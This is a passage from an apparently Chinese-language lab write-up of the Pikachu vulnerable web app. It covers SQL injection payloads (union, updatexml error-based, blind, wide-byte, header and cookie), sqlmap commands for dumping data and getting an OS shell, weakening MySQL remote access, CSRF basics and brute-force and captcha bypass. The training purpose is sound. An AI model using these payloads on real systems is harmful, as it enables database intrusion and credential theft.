alt="image-20240710221945660"></p><p>有时候获取库名比较慢，尤其是在时间盲注的情况下</p><p>查看当前使用的数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap -u &quot;url&quot; --current-db / -r 1.txt --current-db</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710222105522-1723344400331-137.png" alt="image-20240710222105522"></p><p>查看数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap -u &quot;url&quot; -D &quot;pikachu&quot; --tables / -r 1.txt  -D &quot;pikachu&quot; --tables</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710222158340-1723344400331-138.png" alt="image-20240710222158340"></p><p>查看字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap -u &quot;url&quot; -D &quot;pikachu&quot; -T &quot;users&quot; --column / -r 1.txt -D &quot;pikachu&quot; --column</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710223344049-1723344400331-139.png" alt="image-20240710223344049"></p><p>查看字段内容 –dump，中间可能会跳出是否需要破解，先不选，比较耗时间，可以提出来自己去破解</p><p><img src="/../image/image-20240710223608109-1723344400331-140.png" alt="image-20240710223608109"></p><p><img src="/../image/image-20240710223923451-1723344400331-141.png" alt="image-20240710223923451"></p><h2 id="字符型注入get"><a href="#字符型注入get" class="headerlink" title="字符型注入get"></a>字符型注入get</h2><p><img src="/../image/image-20240710224704244-1723344400331-142.png" alt="image-20240710224704244"></p><p>get方法会在url里中看到参数的内容，这里我们就不用sqlmap了，在hackerbar里测试把，同样的注入点，手工联合注入一下</p><p>测试闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.143/pikachu/vul/sqli/sqli_str.php?name=1&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711000759059-1723344400331-143.png" alt="image-20240711000759059"></p><p>单引号，测试字段数，要注意我们传进去的引号被url编码了，所以我们后面的测试语句也要url编码再执行</p><p><img src="/../image/image-20240711085435356-1723344400331-144.png" alt="image-20240711085435356"></p><p>空格是被换成+号了，还是在原来的输入框里测试把，注意加上#号注释后后买你的判断，当我们</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.143/pikachu/vul/sqli/sqli_str.php?name=1%27+order+by+3%23&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711085702514-1723344400331-145.png" alt="image-20240711085702514"></p><p>发现是2个字段，测试回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.143/pikachu/vul/sqli/sqli_str.php?name=1%27+union+select+1%2C2%23&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711085805590-1723344400331-146.png" alt="image-20240711085805590"></p><p>同样的方法，库表列</p><p><img src="/../image/image-20240711090105914-1723344400331-147.png" alt="image-20240711090105914"></p><p>这里就不敲了，拿sqlmap试试batch参数</p><p><img src="/../image/image-20240711092314160-1723344400331-148.png" alt="image-20240711092314160"></p><p>加上batch参数后，就不用一直输如y了，都是执行默认条件，就到这里了</p><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>参考：<a href="https://www.cnblogs.com/IronMind/p/16973627.html">https://www.cnblogs.com/IronMind/p/16973627.html</a></p><p><img src="/../image/image-20240711124400390-1723344400332-149.png" alt="image-20240711124400390"></p><p>通过测试我们可以看到，用%这个通配符，我们可以获得所有得信息，说明存在注入漏洞，测试字段数，测试字段数就不用%了</p><p><img src="/../image/image-20240711124529279-1723344400332-150.png" alt="image-20240711124529279"></p><p>测出来3个，下面就是测试回显位置，和联合注入差不多，如果要用%来做得话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;&amp;submit=搜索</span><br></pre></td></tr></table></figure><p>来通过页面回显是否正常判断，基本上就是靠猜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#x27;and(select count(*)from users)&gt;0 and &#x27;%&#x27;=&#x27;&amp;submit=搜索</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711125140531-1723344400332-151.png" alt="image-20240711125140531"></p><p>没有报错就说明有这个表，对于不存在得表会返回报错信息</p><p><img src="/../image/image-20240711125203234-1723344400332-152.png" alt="image-20240711125203234"></p><p>这里再补充一个sqlmap的参数，他可以用–data指定传递的参数，所以有时候post也可以用这种方法来进行，就不一定要抓波，虽然抓包还是靠谱一点，不会漏参数</p><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p><a href="https://blog.csdn.net/witwitwiter/article/details/115939955">https://blog.csdn.net/witwitwiter/article/details/115939955</a></p><p>感觉就是字符型，主要就是找闭合方式</p><p><img src="/../image/image-20240711125627325-1723344400332-153.png" alt="image-20240711125627325"></p><p>常见闭合方式就是单双引号+括号的组合，比如’ ‘,”,’),”).</p><p><img src="/../image/image-20240711130213464-1723344400332-154.png" alt="image-20240711130213464"></p><h2 id="insert-x2F-update注入"><a href="#insert-x2F-update注入" class="headerlink" title="insert&#x2F;update注入"></a>insert&#x2F;update注入</h2><p>进来页面先注册一个用户，又有一个修改信息的页面，正好对应了insert和update两个操作，来insert把，抓包</p><p><img src="/../image/image-20240711130502034-1723344400332-155.png" alt="image-20240711130502034"></p><p><img src="/../image/image-20240711130523518-1723344400332-156.png" alt="image-20240711130523518"></p><p>简单测试了下，确实存在注入点，用sqlmap测试一下，正好试试–data参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.143/pikachu/vul/sqli/sqli_iu/sqli_reg.php&quot; --data &quot;u</span><br><span class="line">sername=*&amp;password=2&amp;sex=2&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711131220059-1723344400332-157.png" alt="image-20240711131220059">用的时候data的数据可以用*标出来注入点，这里因为前面多打了个引号。。</p><p><img src="/../image/image-20240711131534444-1723344400332-158.png" alt="image-20240711131534444"></p><p>这下出来了，下面试试手注</p><p><a href="https://blog.csdn.net/m0_60988110/article/details/123544853">https://blog.csdn.net/m0_60988110/article/details/123544853</a></p><p>先判断注入点一个’就够，然后判断闭合方式</p><p><img src="/../image/image-20240711152844243-1723344400332-159.png" alt="image-20240711152844243"></p><p>由图我们可以看出闭合方式是一个单引号，但后面还有其它数据给他再闭合一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711161042257-1723344400332-160.png" alt="image-20240711161042257"></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711164022756-1723344400332-161.png" alt="image-20240711164022756"></p><p>查列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;),0x7e),1) and&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711164425914-1723344400332-162.png" alt="image-20240711164425914"></p><p>查数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from users),1,31),0x7e),1) and&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711164836549-1723344400332-163.png" alt="image-20240711164836549"><img src="/../image/image-20240711164914426-1723344400332-164.png" alt="image-20240711164914426"></p><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p>顾名思义，删除注入，我们删除一个留言抓包</p><p><img src="/../image/image-20240711221325301-1723344400332-165.png" alt="image-20240711221325301"></p><p>推测注入点就是那个id，可以发到repeater’试试</p><p><img src="/../image/image-20240711221435752-1723344400332-166.png" alt="image-20240711221435752"></p><p>看下字符型还是数字型</p><p><img src="/../image/image-20240711221533743-1723344400332-167.png" alt="image-20240711221533743"></p><p>可以看到正常回显说明是数字型，但删除了，加参数没返回字段，也就没回显了，可以用报错注入试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">or updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240711223945730-1723344400332-168.png" alt="image-20240711223945730"></p><p>这个还是比较累的，用sqlmap试试</p><p><img src="/../image/image-20240712104538856-1723344400332-169.png" alt="image-20240712104538856"></p><p><img src="/../image/image-20240712104548859-1723344400332-170.png" alt="image-20240712104548859"></p><h2 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http-header注入"></a>http-header注入</h2><p>什么是Http Header注入<br>有些时候，后台开发人员为了验证客户端头信息(比如常用的cookie验证)<br>或者通过http header头信息获取客户端的一些信息，比如useragent、accept字段等等。<br>会对客户端的http header信息进行获取并使用SQL进行处理,如果此时没有足够的安全考虑，则可能会导致基于http header的SQL Inject漏洞。<br><img src="/../image/image-20240712111835963-1723344400332-171.png" alt="image-20240712111835963"></p><p>登陆上去，刷新页面抓包，测试下User-agent是否存在注入点，发现是存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240712112358545-1723344400332-172.png" alt="image-20240712112358545"></p><p>可以爆出库名，下面就是一步一步的测试了，要注意前后引号闭合，逻辑连续</p><p><img src="/../image/image-20240712113252213-1723344400332-174.png" alt="image-20240712113252213"></p><p>也可以用sqlmap注入，但要用-p指定，因为默认的level好像是不检查这些字段的</p><p><img src="/../image/image-20240712152543681-1723344400332-173.png" alt="image-20240712152543681"></p><p>试试cookie注入，前面的-p也可以指定cookie</p><p><img src="/../image/image-20240713220931790-1723344400332-175.png" alt="image-20240713220931790"></p><p>加个引号之后，有报错回显，这里就不手工测了，sqlmap测一下–cookie参数，顺便补充个知识点，–form能看post的表单，省的抓包，但我感觉还是抓个包不容易漏东西</p><p><img src="/../image/image-20240713221800329-1723344400332-176.png" alt="image-20240713221800329"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.160/pikachu/vul/sqli/sqli_header/sqli_header.php&quot; --cookie=&quot;uname=admin&quot; --level 3</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240713222231002-1723344400333-177.png" alt="image-20240713222231002"></p><p>也是可以测试出来的，试试-p</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;python sqlmap.py -r 1.txt -p cookie --level 3</span><br></pre></td></tr></table></figure><p>好像不能加batch，中间有个要编码选项要选no，不然会失败</p><p><img src="/../image/image-20240713223919742-1723344400333-178.png" alt="image-20240713223919742"></p><p><img src="/../image/image-20240713223812689-1723344400333-186.png" alt="image-20240713223812689"></p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注分为布尔盲注和时间盲注，都是根据页面的不同响应来爆破信息等，这里</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><img src="/../image/image-20240712115458455-1723344400333-179.png" alt="image-20240712115458455"></p><p>当我们输入kobe时，是正常回显，现在我们给他加上注入，加上不正常的输入时</p><p><img src="/../image/image-20240712135748747-1723344400333-185.png" alt="image-20240712135748747"></p><p>它会提示我们用户不存在，这时候，如果我们再将他后面的判断条件补上一个恒真的式子时</p><p><img src="/../image/image-20240712144359960-1723344400333-180.png" alt="image-20240712144359960"></p><p>再结合上ascii和substr函数，慢慢对字段进行爆破，这里以数据库为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and ascii(substr(database(),1,1))=112#</span><br></pre></td></tr></table></figure><p>ascii码112是p正好对应pikachu的第一个，就这样慢慢测试，所以用sqlmap比较方便</p><p><img src="/../image/image-20240712144909367-1723344400333-181.png" alt="image-20240712144909367"></p><p>这里扫出来是用时间盲注，这里两个都是可以用的，知识sqlmap先使用那个的区别罢了</p><p><img src="/../image/image-20240712150737350-1723344400333-182.png" alt="image-20240712150737350"></p><p>最后也是扫出来了</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>布尔盲注是根据回显页面不同来判断爆破数据，而时间盲注则是通过返回时间的不同来判断判断猜测的数据是否正确</p><p>说明存在一个基于时间的payload。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and if((substr(database(),1,1))=&#x27;</span>p<span class="string">&#x27;,sleep(5),null)#</span></span><br></pre></td></tr></table></figure><p>时间停止了5秒，则说明第一个字符是p。如果时间不停止，则说明不是p，这样字测试也比较累，还是用sqlmap把</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><a href="https://blog.csdn.net/qq_46091464/article/details/105893529">https://blog.csdn.net/qq_46091464/article/details/105893529</a></p><p><a href="https://blog.csdn.net/qq_45813980/article/details/119295166">https://blog.csdn.net/qq_45813980/article/details/119295166</a></p><p><img src="/../image/image-20240713214501600-1723344400333-183.png" alt="image-20240713214501600"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --batch --tamper=unmagicquotes.py --current-db</span><br></pre></td></tr></table></figure><p>宽字节要用到tamper里的脚本</p><p>下面来手工测试一下</p><p><img src="/../image/image-20240713215112423-1723344400333-187.png" alt="image-20240713215112423"></p><p>下面就是正常的测试了，我们来看看源码分以下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;<span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line">    <span class="comment">//设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题</span></span><br><span class="line">    <span class="variable">$set</span> = <span class="string">&quot;set character_set_client=gbk&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>,<span class="variable">$set</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysqi_query不打印错误描述</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt;= <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:<span class="subst">&#123;$id&#125;</span> &lt;br /&gt;your email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>单引号因为PHP中使用addslashes函数，被转义为\’，编码后就是%5c%27<br>加上pyload中的%df 后，就是 %df%5c%27 ,然后MySQL在使用GBK编码的时候，会认为两个字符为一个汉字， %df%5c就被解析为一个汉字，%27也就是单引号就成功逃逸了，成功实现闭合，后面就可以通过or 来执行语句了。</p><h2 id="sqlmap获取shell"><a href="#sqlmap获取shell" class="headerlink" title="sqlmap获取shell"></a>sqlmap获取shell</h2><p><a href="https://www.cnblogs.com/xinxin999/p/12411990.html">https://www.cnblogs.com/xinxin999/p/12411990.html</a></p><p>首先是–os-shell，os-shell创建一个对方操作系统的shell，远程执行系统命令,但是我们的知道一些条件，第一是语言，这个很简单</p><p><img src="/../image/image-20240713225154807-1723344400333-184.png" alt="image-20240713225154807"></p><p>第二是晓得绝对路径,怎么找绝对路径我也总结了，就在我的github上，选项一为用这几个路径，选项二为用户自己输入，选项三为用用户的字典，选项四为爆破。</p><p><img src="/../image/image-20240713225517818-1723344400333-188.png" alt="image-20240713225517818"></p><p>但这里失败了，看了下有三个条件</p><p>1、网站是root权限</p><p>2、攻击者要知道绝对路径</p><p>3、GPC为off，php主动转义功能关闭</p><p><a href="https://www.freebuf.com/articles/es/229425.html">https://www.freebuf.com/articles/es/229425.html</a></p><p>原理：<a href="https://www.cnblogs.com/BxScope/p/10883422.html">https://www.cnblogs.com/BxScope/p/10883422.html</a></p><p>权限：<a href="https://blog.csdn.net/Jiajiajiang_/article/details/86226884">https://blog.csdn.net/Jiajiajiang_/article/details/86226884</a></p><p>下面按这几步试试</p><p><img src="/../image/image-20240713230405321-1723344400333-189.png" alt="image-20240713230405321"></p><p>可以看到是false，再看看current-user</p><p><img src="/../image/image-20240713230436734-1723344400333-190.png" alt="image-20240713230436734"></p><p>发现是root啊，可能是没有权限，去赋予一下</p><p><img src="/../image/image-20240713231604988-1723344400333-192.png" alt="image-20240713231604988"></p><p>还是失败，估计是有什么东西没开，搜了下，secure_file_priv的值要为空，就是什么都没有</p><p><img src="/../image/image-20240714142051639-1723344400333-191.png" alt="image-20240714142051639"></p><p>如果显示是null的话，可以去my.ini的[mysqld]下添加</p><p><img src="/../image/image-20240714142939925-1723344400333-193.png" alt="image-20240714142939925"></p><p><img src="/../image/image-20240714143058920-1723344400333-194.png" alt="image-20240714143058920"></p><p>可以看到成功写如shell</p><p><img src="/../image/image-20240714143123757-1723344400333-195.png" alt="image-20240714143123757"></p><p>试试–os-cmd&#x3D;whoami,感觉前面那个能执行，这个也可以，文章说这个是不需要你输入路径的，我们只需要看自己的权限,是不是DBA权限–is-dba。如果是sqlserver要看开启xp_cmdshell没有，如果开启了，那就可以使用。</p><p><img src="/../image/image-20240714143427236-1723344400343-196.png" alt="image-20240714143427236"></p><p>–sql-shell，这个就是获取执行sql的shell，可以在里面执行查询语句等</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select host,user,password from mysql.user</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240714144556064-1723344400343-198.png" alt="image-20240714144556064"></p><p>也可以用load_file读取一些文件</p><p><img src="/../image/image-20240714145525075-1723344400343-197.png" alt="image-20240714145525075"></p><p><img src="/../image/image-20240714145620239-1723344400343-199.png" alt="image-20240714145620239"></p><p>也可以写入一句话木马</p><p><img src="/../image/image-20240714150148056-1723344400343-200.png" alt="image-20240714150148056"></p><p>但返回信息要要可以执行堆叠注入才行，等等换个试试，试试连接数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -d &quot;mysql://root:root@192.168.174.160/pikachu&quot;</span><br></pre></td></tr></table></figure><p>也不行，要开启远程连接权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;;</span><br><span class="line">select * form user;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240714153935640-1723344400343-201.png" alt="image-20240714153935640"></p><p><img src="/../image/image-20240714154003256-1723344400343-203.png" alt="image-20240714154003256"></p><p>测试下写马，但好像文件没有开写权限所以写不进去，还是比较麻烦的，还得文件有写入得权限</p><h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><p>​Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p><p>CSRF不能获取到Cookie,只能借用而xss是能获取到明文cookie的</p><p>XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p><p>一、通过图片的img src属性，自动加载，发起GET请求</p><p><img src="/../image/image-20240331190038758-1723344400343-202.png" alt="image-20240331190038758"></p><p>二、构建一个超链接，用户点击以后，发起GET请求</p><p><img src="/../image/image-20240331190045386-1723344400343-204.png" alt="image-20240331190045386"></p><p>三、构建一个自动提交的表单(隐藏)，用户访问，发起POST请求</p><p><img src="/../image/image-20240331190054998-1723344400343-205.png" alt="image-20240331190054998"></p><p>攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求;反之，攻击者将无法攻击成功。</p><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>a、我们能不能区分一个请求是来自于自己的前端页面，还是第三方的网站?<br>b、怎么让自己的前端页面和伪造的请求变得不一样呢?</p><img src="../image/image-20240331194910090-1723344400343-207.png" alt="image-20240331194910090" style="zoom:150%;" /><h1 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h1><h2 id="1-1暴力破解"><a href="#1-1暴力破解" class="headerlink" title="1.1暴力破解"></a>1.1暴力破解</h2><p><img src="/../image/image-20240318225709237-1723344400343-206.png" alt="image-20240318225709237"></p><p><strong>账号或密码都不存在，上BP</strong></p><p><img src="/../image/image-20240318225759689-1723344400343-208.png" alt="image-20240318225759689"></p><p>发送攻击模块，因为用户名或密码都不知道，同时进行爆破</p><p><img src="/../image/image-20240318230410118-1723344400343-209.png" alt="image-20240318230410118"></p><p><strong>首先对变量1进行设置。</strong></p><p><img src="/../image/image-20240318230523188-1723344400343-210.png" alt="image-20240318230523188"></p><p><img src="/../image/image-20240318230531586-1723344400343-212.png" alt="image-20240318230531586"></p><p><strong>然后开始攻击即可</strong></p><p><img src="/../image/image-20240318231413305-1723344400343-211.png" alt="image-20240318231413305"></p><p><img src="/../image/image-20240318231427803-1723344400343-213.png" alt="image-20240318231427803"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//典型的问题,没有验证码,没有其他控制措施,可以暴力破解</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=? and password=md5(?)&quot;</span>;</span><br><span class="line">    <span class="variable">$line_pre</span> = <span class="variable">$link</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$line_pre</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;ss&#x27;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;<span class="title function_ invoke__">execute</span>())&#123;</span><br><span class="line">        <span class="variable">$line_pre</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$line_pre</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt; login success&lt;/p&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt; username or password is not exists～&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.= <span class="string">&#x27;&lt;p&gt;执行错误:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;errno.<span class="string">&#x27;错误信息:&#x27;</span>.<span class="variable">$line_pre</span>-&gt;error.<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-验证码绕过server"><a href="#1-2-验证码绕过server" class="headerlink" title="1.2.验证码绕过server"></a>1.2.验证码绕过server</h2><p><img src="/../image/image-20240318231729781-1723344400344-214.png" alt="image-20240318231729781"></p><p>随便输输，验证失败后会刷新验证码，抓包试试</p><p><img src="/../image/image-20240318231830331-1723344400344-216.png" alt="image-20240318231830331"></p><p>猜测只有当页面刷新时，验证码才会重新刷新</p><p><img src="/../image/image-20240318231923965-1723344400344-215.png" alt="image-20240318231923965"></p><p>可以看到，确实是这样，可能验证码都在数据库里，不是随机生成的。</p><p><img src="/../image/image-20240318232122468-1723344400344-217.png" alt="image-20240318232122468"></p><p>同样可以成功</p><h2 id="1-3-验证码绕过client"><a href="#1-3-验证码绕过client" class="headerlink" title="1.3.验证码绕过client"></a>1.3.验证码绕过client</h2><p><img src="/../image/image-20240319004351349-1723344400344-218.png" alt="image-20240319004351349"></p><p>客户端验证码，先输入正确的测试一下</p><p><img src="/../image/image-20240319120748583-1723344400344-219.png" alt="image-20240319120748583"></p><p>是正常显示的，考虑到是客户端验证码，查看其生成验证码原理（源代码）</p><p><img src="/../image/image-20240319120925622-1723344400344-220.png" alt="image-20240319120925622"></p><p>在源代码中搜错这个函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">    <span class="keyword">var</span> checkCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> charIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">36</span>);</span><br><span class="line">        code += selectChar[charIndex];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//alert(code);</span></span><br><span class="line">    <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">        checkCode.<span class="property">className</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">        checkCode.<span class="property">value</span> = code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>) 